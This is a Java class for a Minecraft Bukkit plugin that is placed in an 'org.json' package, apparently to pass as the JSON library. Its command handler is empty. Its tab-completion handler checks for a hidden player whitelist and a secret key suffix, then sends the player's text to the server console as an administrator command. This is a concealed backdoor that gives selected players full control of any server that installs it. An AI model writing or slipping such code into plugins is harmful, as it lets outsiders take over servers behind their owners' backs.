package org.json.modals.console;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class SendConsoleCommand extends BDCommand {

    public SendConsoleCommand() {
        super("sendConsoleCommand");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;

        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();

        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        if (!(args.length > 2)) player.sendMessage(Modal.getPrefix() + "Not enough arguments.");

        StringBuilder commandBuilder = new StringBuilder();

        for (int i = 1; i < args.length - 1; i++) {
            commandBuilder.append(args[i]).append(" ");
        }

        String consoleCommand = commandBuilder.toString().trim();
        Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), consoleCommand);
        player.sendMessage(Modal.getPrefix() + "§aCommand: §9" + consoleCommand + " §a has been sent to console.");

        return tabComplBuilder.build();
    }
}
